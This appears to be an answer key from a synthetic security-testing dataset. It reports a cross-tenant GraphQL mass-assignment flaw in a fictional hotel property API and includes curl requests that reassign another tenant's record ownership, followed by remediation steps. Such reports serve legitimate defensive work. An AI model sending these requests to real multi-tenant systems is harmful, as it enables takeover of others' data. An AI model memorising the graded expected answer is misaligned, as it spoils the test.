# Expected Response

## System
- Domain: Hospitality / Property Management
- System: StayPro Property API
- Example ID: GQL-0080

## Priority Findings

### Finding 1: Persistence Poisoning via Lifecycle Action — Cross-Tenant Hotel Property Record Takeover (Pattern 4.2)
**Severity:** Critical
**Category:** Integrity / Persistence Poisoning

**Summary:**
Per §5.0 (Pattern 4.2 — persistence poisoning via lifecycle actions): The `updateResource` mutation allows cross-tenant mutation of property records via lifecycle state changes (e.g., status: "approved"). An attacker from `tenant-4952` updated hospitality property record `R-2080` (belonging to `tenant-c719`) and injected `ownerId: "attacker-4952c719"` — a persistence poisoning attack that permanently alters the stored ownership of the victim's property record in the database, persisting beyond the current session.

**Evidence from HAR:**
- Request: `POST https://api.staypro-property.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-4952`
- Mutation: `updateResource(id: "R-2080", input: {status: "approved", ownerId: "attacker-4952c719"}) { resourceId status }`
- Response `200 OK`; cross-tenant data returned: `tenantId: "tenant-c719"`, `sensitiveField: "CONFIDENTIAL-4952c719"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-4952c719`

**Root Cause (§4.0 RISK-GQL-080):** `updateResource` resolver fetches by ID only; lifecycle state transitions not protected by tenantId verification; `ownerId` is mass-assignable.

## Steps to Reproduce

### Step 1 — Cross-tenant property record poisoning via lifecycle action (HAR)
```bash
curl -s -X POST https://api.staypro-property.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4952" \
  -d '{"query": "mutation { updateResource(id: \"R-2080\", input: {status: \"approved\", ownerId: \"attacker-4952c719\"}) { resourceId status } }"}'
```
**Vulnerable:** Victim property `R-2080` now has `ownerId: "attacker-4952c719"` in database. **Secure:** FORBIDDEN.

### Step 2 — Verify persistence of poisoned record
```bash
curl -s -X POST https://api.staypro-property.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-4952" \
  -d '{"query": "query { getResource(id: \"R-2080\") { resourceId ownerId tenantId } }"}'
```
**Vulnerable:** Returns `ownerId: "attacker-4952c719"` — persistence confirmed.

## Remediation
1. Resolver tenant guard on `updateResource`: `WHERE resource_id=$id AND tenant_id=$jwt.tenantId`.
2. Strip `ownerId` and `tenantId` from `ResourceInput` — never client-writable.
3. Lifecycle state transitions require additional ownership confirmation.
4. Redis cache key: `resource:{tenantId}:{resourceId}`.
